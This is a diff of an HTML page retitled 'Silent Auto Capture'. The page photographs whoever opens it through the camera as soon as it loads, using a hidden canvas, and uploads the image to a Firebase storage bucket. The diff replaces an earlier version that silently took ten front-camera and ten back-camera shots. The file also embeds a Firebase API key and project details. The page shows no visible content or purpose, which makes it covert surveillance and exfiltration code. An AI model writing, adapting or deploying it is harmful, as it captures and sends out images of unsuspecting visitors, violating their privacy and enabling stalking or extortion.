@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture 10 Front & 10 Back Images</title>
+    <title>Silent Auto Capture</title>
 
     <!-- Firebase SDK -->
     <script type="module">
@@ -12,7 +12,7 @@
 
         // ✅ Replace with your Firebase config
         const firebaseConfig = {
-            apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
+           apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
   authDomain: "valute3.firebaseapp.com",
   databaseURL: "https://valute3-default-rtdb.firebaseio.com",
   projectId: "valute3",
@@ -26,79 +26,46 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        async function getCameraStream(useFrontCamera) {
-            const constraints = {
-                video: {
-                    facingMode: useFrontCamera ? "user" : "environment"
-                }
-            };
-            return await navigator.mediaDevices.getUserMedia(constraints);
-        }
-
-        async function captureAndUploadPhoto(video, index, useFrontCamera) {
+        async function captureAndUploadPhoto() {
             try {
+                // ✅ Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                // ✅ Wait for the video to load
+                await new Promise(resolve => (video.onloadedmetadata = resolve));
+
+                // ✅ Create a hidden canvas
                 const canvas = document.createElement("canvas");
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext("2d");
 
-                // ✅ Capture image from video stream
+                // ✅ Capture image from video
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // ✅ Stop the camera stream
+                stream.getTracks().forEach(track => track.stop());
 
                 // ✅ Convert image to Blob and upload
                 canvas.toBlob(async (blob) => {
-                    const cameraType = useFrontCamera ? "front" : "back";
-                    const fileName = `images786123/${cameraType}_${index + 1}_${Date.now()}.png`;
+                    const fileName = `images/captured_${Date.now()}.png`;
                     const storageRef = ref(storage, fileName);
                     await uploadBytes(storageRef, blob);
 
                     // ✅ Get download URL
                     const downloadURL = await getDownloadURL(storageRef);
-                    console.log(`Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
+                    console.log("Image uploaded:", downloadURL);
                 }, "image/png");
             } catch (error) {
                 console.error("Error capturing image:", error);
             }
         }
 
-        async function captureMultipleImages() {
-            console.log("📸 Requesting camera permission...");
-
-            // ✅ Request camera permission only once
-            const frontStream = await getCameraStream(true);
-            const backStream = await getCameraStream(false);
-
-            const frontVideo = document.createElement("video");
-            frontVideo.srcObject = frontStream;
-            frontVideo.play();
-            await new Promise(resolve => (frontVideo.onloadedmetadata = resolve));
-
-            const backVideo = document.createElement("video");
-            backVideo.srcObject = backStream;
-            backVideo.play();
-            await new Promise(resolve => (backVideo.onloadedmetadata = resolve));
-
-            console.log("📸 Capturing 10 Front & 10 Back Images...");
-
-            // ✅ Capture 10 front camera images
-            for (let i = 0; i < 10; i++) {
-                await captureAndUploadPhoto(frontVideo, i, true);
-            }
-
-            // ✅ Capture 10 back camera images
-            for (let i = 0; i < 10; i++) {
-                await captureAndUploadPhoto(backVideo, i, false);
-            }
-
-            // ✅ Stop camera streams
-            frontStream.getTracks().forEach(track => track.stop());
-            backStream.getTracks().forEach(track => track.stop());
-
-            console.log("✅ All images captured and uploaded!");
-        }
-
-        // ✅ Start capturing when the page loads
-        window.onload = captureMultipleImages;
+        // ✅ Automatically capture and upload photo in background
+        window.onload = captureAndUploadPhoto;
     </script>
 </head>
 <body>
